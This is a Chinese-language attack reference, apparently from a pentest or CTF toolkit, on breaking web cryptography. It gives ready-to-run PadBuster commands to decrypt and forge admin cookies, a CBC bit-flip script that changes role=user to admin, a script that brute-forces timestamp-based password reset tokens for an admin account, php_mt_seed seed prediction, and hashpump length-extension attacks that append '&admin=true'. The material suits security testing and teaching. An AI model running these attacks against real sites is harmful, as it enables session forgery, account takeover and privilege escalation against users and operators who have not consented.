# Web 密码学攻击（加密 Token/Cookie 场景）

> 何时用：Web 应用使用加密 Cookie/参数、哈希签名参数、随机 Token，且实现存在缺陷（oracle 反馈、可预测随机数、CBC 结构可辨识）。
> 密码学原理层（PKCS7 手写代码/bit-flip 推导/长度扩展 padding 构造/LCG）见 `$OPENCODE_ROOT/crypto-analysis/knowledge-base/symmetric-and-hash.md`（跨领域引用，路径以 $OPENCODE_ROOT 为基准），本文只写 Web 场景应用。

## 1. 攻击方向决策表

| 看到什么 | 攻击方向 | 工具 |
|---|---|---|
| 加密 Cookie/参数 + 解密失败响应有差异 | Padding Oracle | padbuster（§2） |
| 密文含 role=user 等可辨识明文结构（CBC） | CBC bit-flip | Python XOR 脚本（§3） |
| 密码重置 + 短 Token 基于时间戳 | 弱随机数爆破 | 时间戳枚举脚本（§4） |
| 参数带 sign=md5hash 类签名（secret 前置拼接） | 哈希长度扩展 | hashpump（§5） |
| Token 以 eyJ 开头（Base64 JSON） | JWT 攻击 | 见 `web-vulnerabilities.md` §2.2 |
| PHP 侧随机数来自 mt_rand() | 种子预测 | php_mt_seed（§4） |
| AES-ECB 加密 Cookie（相同明文块→相同密文块） | ECB 块重排 cut-and-paste | 见 symmetric-and-hash.md §2 |

判断顺序: 密文格式（eyJ=JWT / hex / base64）→ 解密反馈差异（oracle）→ 明文结构可辨识度（bit-flip / ECB 重排）→ Token 生成方式（弱随机 / 签名拼接）。

## 2. Padding Oracle + PadBuster

### 2.1 识别

入口: 加密 Cookie（captcha=BASE64_CIPHER、加密 session）、加密 URL 参数。

1. 修改密文某字节 → 返回 500（padding error）
2. 修改另一字节 → 返回 200/302（padding 正确但数据错误）
3. 状态码/报错内容/时延任一有差异 → oracle 存在

典型场景: ASP.NET Padding Oracle（CVE-2010-3332）、自定义加密 Cookie（role=user → 改 role=admin）。

### 2.2 PadBuster 用法

```bash
# 解密（URL 参数密文）
padbuster http://target/api ENCRYPTED_TOKEN 16 -encoding 0

# Cookie 场景解密
padbuster http://target/ COOKIE_VALUE 16 -cookies "session=COOKIE_VALUE" -encoding 0

# 伪造任意明文（如伪造 admin Cookie）
padbuster http://target/ COOKIE_VALUE 16 -cookies "session=COOKIE_VALUE" \
    -encoding 0 -plaintext '{"user":"admin","role":"admin"}'

# POST 场景
padbuster http://target/decrypt ENCRYPTED 16 -post "data=ENCRYPTED" -encoding 0

# 非标准错误响应时指定错误特征串
padbuster http://target/ TOKEN 16 -error "Invalid padding" -encoding 0
```

参数（官方 padBuster.pl v0.3.3 源码核验）:
- `-encoding [0-4]` 默认 0: **0=Base64, 1=小写 HEX, 2=大写 HEX, 3=.NET UrlToken, 4=WebSafe Base64**（部分教程流传的"0=hex"是错的）
- BlockSize: AES=16, DES=8；样本字节数必须被 BlockSize 整除，否则报错（编码/块大小选错的第一信号）
- 样本只有一个块 → 需 `-noiv`（解密模式默认首块为 IV）
- 不传 `-error` → 自动响应分析：先发 256 个请求列出响应签名频次表，选频次最高者为错误签名
- `-noencode` 关闭默认 payload URL 编码；`-usebody` 用响应体做分析；`-resume N` 断点续跑；`-interactive` 逐字节确认（网络噪声时）
- 依赖 Perl + LWP（Kali: `apt install padbuster`）；不可用见 symmetric-and-hash.md §4 手写版

## 3. CBC Bit-Flip 篡改加密 Cookie

修改第 N 块密文字节 → 精确翻转第 N+1 块明文对应字节。公式: `cipher[offset] ^= ord(原字符) ^ ord(目标字符)`。

```python
import base64
cipher = bytearray(base64.b64decode(token))
offset = 0  # 按目标明文在块内位置计算（目标在第 2 块则改第 1 块）
cipher[offset]   ^= ord('u') ^ ord('a')   # user → admin
cipher[offset+1] ^= ord('s') ^ ord('d')
cipher[offset+2] ^= ord('e') ^ ord('m')
cipher[offset+3] ^= ord('r') ^ ord('i')
print(base64.b64encode(cipher).decode())
```

注意事项:
1. 被修改块自己的明文变垃圾——应用若校验该块则失败；翻转目标应选紧邻块，被破坏块放无关数据区（如 padding 区）
2. 替换须等长（user→admin 4→5 不等长，第 5 字节需按 padding/后续内容单独处理）
3. 改完解密报 padding 错 → 翻转到了 padding 区

单字节通用函数见 symmetric-and-hash.md §3。

## 4. 弱随机数 / 可预测 Token

### 4.1 识别指纹

- 密码重置 Token = md5(timestamp + email)
- Session ID 递增或基于可预测种子
- CSRF Token = 用户 ID 的简单哈希
- PHP 侧随机数来自 mt_rand()

### 4.2 时间戳 Token 爆破

```python
import hashlib, time, requests
target_email = "admin@target.com"
reset_time = int(time.time())
for ts in range(reset_time - 60, reset_time + 60):
    token = hashlib.md5(f"{ts}{target_email}".encode()).hexdigest()
    r = requests.get(f"http://target/reset?token={token}")
    if r.status_code == 200 and 'expired' not in r.text:
        print(f"[+] Valid token: {token} (ts={ts})"); break
```
枚举窗口按服务端时钟偏差调整（±60s 起步；容器/分布式环境时钟漂移可能更大）。

### 4.3 PHP mt_rand() 种子预测

```bash
php_mt_seed OUTPUT_VALUE   # 从单个输出恢复种子 → 预测该进程后续全部输出
```
关联场景: 随机文件名/验证码/Token 由 mt_rand() 生成且输出可观测（回显验证码、文件名带随机数）→ 预测下一个值。
random_int()/random_bytes()（CSPRNG）不可预测，不适用。

## 5. 哈希长度扩展（hashpump CLI）

```bash
hashpump -s ORIGINAL_HASH -d 'original_data' -a '&admin=true' -k SECRET_LENGTH
```

SECRET_LENGTH 未知 → 暴力枚举（通常 8-32）:
```python
import hashpumpy
for key_len in range(8, 33):
    new_hash, new_data = hashpumpy.hashpump(original_hash, 'original_data', '&admin=true', key_len)
    # 用 new_hash + new_data 发请求验证
```

适用: H(secret∥msg)（secret 前置，MD5/SHA1/SHA256）。不适用: H(msg∥secret)、HMAC、SHA-3、BLAKE2。原理与手工 padding 构造见 symmetric-and-hash.md §5。
